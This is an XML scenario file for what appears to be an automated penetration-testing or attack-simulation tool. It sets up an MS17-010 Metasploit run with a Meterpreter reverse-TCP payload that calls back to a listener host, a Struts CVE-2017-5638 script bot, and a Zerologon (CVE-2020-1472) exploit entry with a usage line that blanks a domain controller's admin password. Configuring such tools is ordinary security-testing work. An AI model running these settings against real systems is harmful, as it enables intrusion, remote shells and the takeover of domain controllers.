<?xml version="1.0" encoding="UTF-8"?><toolscenarios><toolscenario><id>1</id><name>test</name><description>test</description><uniqueid>201</uniqueid><uniquekey>wvfFF7c2YaTYsVwgvOTMCWaAlHHdmV1U</uniquekey><price>1.0</price><profile><keywords>test</keywords><conflevel>1</conflevel><creator>dmanners</creator></profile><scenario><name>MS17-010</name><description>MS17-010 Exploit</description><layout>block-|5|14|0|211|259~block-|6|9|5|102|97~connector-|6|5</layout><blocks><block id="5" type="14"><parameters><parameter name="victim_name" value="Attacker PC"/><parameter name="victim_ip" value="172.16.50.151"/></parameters></block><block id="6" type="9"><bot action="1" enabled="true" event="4" id="5" name="MS17-010" trigger="2" type="4"><parameters><parameter name="vuln_cve" type="1" value="CVE-2017-0148"/><parameter name="MODULE" type="2" value="/exploits/windows/smb/ms17_010_psexec"/><parameter name="RHOSTS" type="2" value="@IP@"/><parameter name="LHOST" type="2" value="172.16.41.1"/><parameter name="PAYLOAD" type="2" value="windows/meterpreter/reverse_tcp"/><parameter name="irc_msgformat" type="3" value=""/></parameters></bot></block></blocks></scenario><bots><bot action="8" enabled="true" event="7" id="92" name="Struts_2017-5638" trigger="2,4" type="1"><parameters><parameter name="irc_custommsg" type="3" value="on"/><parameter name="script_cmdparams" type="2" value="@SIMVAR@"/><parameter name="slack_msgformat" type="3" value="@RESULT@"/><parameter name="slack_custommsg" type="3" value="on"/><parameter name="script_file" type="2" value="CVE-2017-5638.sh"/><parameter name="irc_sendsession" type="3" value="on"/><parameter name="irc_sendall" type="3" value="on"/><parameter name="irc_msgformat" type="3" value="@RESULT@"/></parameters></bot></bots><localtools><localtool><id>20</id><name>CVE-2020-1472</name><description>netzero exploit - be very carefule as it sets admin to blank&#13;
./cve-2020-1472-exploit.py -n EXAMPLE-DC -t 1.2.3.4&#13;
for full use see&#13;
https://github.com/VoidSec/CVE-2020-1472&#13;
</description><uniqueid>1015</uniqueid><uniquekey>EVmPaWcZsnWsrZeBTpTUtMz6CCamnvn4</uniquekey><price>0.0</price><trainingvideo>https://asciinema.org/a/359833</trainingvideo><profile><keywords>CVE-2020-1472,zerologin,</keywords><conflevel>10</conflevel><creator>Darren Manners</creator></profile><bots/><additionalfiles>CVE-2020-1472_inst.sh,,,,,,,,,</additionalfiles><installscript>CVE-2020-1472_inst.sh</installscript></localtool></localtools><additionalfiles>,,,,,,,,,</additionalfiles></toolscenario></toolscenarios>